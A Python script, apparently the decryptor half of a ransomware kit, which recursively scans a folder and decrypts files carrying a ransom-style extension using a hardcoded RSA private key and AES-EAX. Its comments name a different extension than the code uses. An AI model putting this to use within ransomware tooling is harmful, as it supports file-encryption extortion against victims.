import os
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES


privateKeyFile = 'private.pem'


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)


def decrypt(dataFile, privateKeyFile):
    '''
    use EAX mode to allow detection of unauthorized modifications
    '''
    extension = dataFile.suffix.lower()
    privateKey = '''MIIEogIBAAKCAQEAwOzD6XFGB19gru9+BbpepNDLucaTN/PQkQMkvAPEJgw+6nxr
FwHAm2BZeE3dmI0RNL7fm8RxhYC3bT7OxsR8K7biLKAGoXiFNNGPAGferVTMwaF+
GW7IGt9/BLMZ9vsnypXx+sHbSvEjew35yrJ1O+ZU/0IGSWVP6/qk/rofd9VjlJ3F
pq38bz79ZxMe4t5vZaoKN8yFlLyEt+q+pRQZenuVuye+Rv2J3advl5JuKyU0OxYe
MCk3DviWdvfZBV8wDrTr2fYaLvWuBa21nCtguH8jNsNJa7qBwwphWUsiJhBhewO/
njmjFsHBxiQQ52PSZK6yrkUJRHDbXTEM5a2lnwIDAQABAoIBABXs0nb9QJAl7r7y
yMet3oOslvqN7r01IEbarJoRc4E/cwcDDMiYkmMWGBTsBHsJzSLJbnAtaxlY/3+S
270LJ3FwX1Pi+93t7HWMO0w4gb4BHSQETmhlhqhHLhBCqni/Ik6Lq+xri5iAvx+E
/xZiIaClFJPN1RkSQnr3CTlJvbnIe89cVCsDkeGtcY9a0Yra8HrVIW+stKCa47yf
XZVl/dw4UCz03lNjJDwGxH30eQGtpUO4qXgw5nTNZX8dod+8AU4ewa7oOFZ24wB1
lycUYayHMG0N03YiV1byFML1J4aTRJwBuMd1qkUb0DleIR9nNlQPL7Us5IFd7fiB
ALwr/wECgYEAzETAVzyhkX3UzzQzE27b3Uy2CeQ8+DqVHfGHHjmdE/w85jYmlfN+
3ihZtkb4xgjkjr5o5tlsLCUN9zKMZfhhyyJQyWmTA2uk5yJ+vLKcq5MTj2Lh7iiv
rlrdVNTb7koauD2x6UHjhpYz8WChGP4D0dz/zZi5lGjHVWFs4E1YUs8CgYEA8ciS
ytPsE98Dx3gEldg4oDKblpJRiQuHN8V1Jir/kjQQnTCwekJlYt5yRwnmIo92k9d9
MUKVfjTaC3ObiSOcSwC8rsFwUEcN6HTmHiXuGO4e9vJ2X8zhHeFj6oW+Tzp0UHK4
yavbafMCOCiGLrdRgaeqXaW/Xl69noKJ1lnAdDECgYBpANqCvacsXCu+C85Jqg4Z
l2pocUwqKisnRlY34lPtxxcjHCj/ojjQSJu9SIRvgHjFK/pO2OtzUeT48qIbdPAI
dO5kawHomzgcnK3boFFLHYLLjYAoZf/RN+JYzkb0GmHb3dML3hPwxluTNCH77+/U
vK8+Z8jWEnqNWFSYhQnnHwKBgAoVMDHvJoApo7G0ypQpIStlEOH1lhrd9TSZMmp2
DpRdQXgcqK9gh3PZDPDzc7prOymtKdZdDXjm4VTq7EiKyKDEFho/jNx8KhNQlKwb
LtOxUm8/6znRhG3HkXAdRbNuH52fOx+F4C+J58TJw9a85FRA1rTzDYj08HlkvjTH
J2RxAoGATCOVwKJ+3l77bbZjQVNkjsKLbqeBFe0e5BtRkuX4OellfaYtOq1dHEZV
NT1ANk0WGV98Qd9awBakg3/miBo9fFtNdrnz2IisHpyeUvqSI7LRxQYGsyhrWgWN
uXdjkAvcNyqzet4tt0stJXuwhKuwj58gsX4EvUd88kU1GEBJfCQ='''
    privateKey = base64.b64decode(privateKey)
    key = RSA.import_key(privateKey)

    # read data from file
    with open(dataFile, 'rb') as f:
        # read the session key
        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(key)
    sessionKey = cipher.decrypt(encryptedSessionKey)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    dataFile = str(dataFile)
    fileName= dataFile.split(extension)[0]
    fileExtension = '.decrypted' # mark the file was decrypted
    decryptedFile = fileName + fileExtension
    with open(decryptedFile, 'wb') as f:
        f.write(data)

    print('Decrypted file saved to ' + decryptedFile)

directory = './' # CHANGE THIS


# because we need to decrypt file focus on .L0v3sh3 extension here is the code
includeExtension = ['.4l3j0'] # CHANGE THIS make sure all is lower case

for item in scanRecurse(directory): 
    filePath = Path(item)
    fileType = filePath.suffix.lower()
    # run the decryptor just if the extension is .l0v3sh3
    if fileType in includeExtension:
      #print(Path(filePath)) # testing the scanning file
      decrypt(filePath, privateKeyFile)
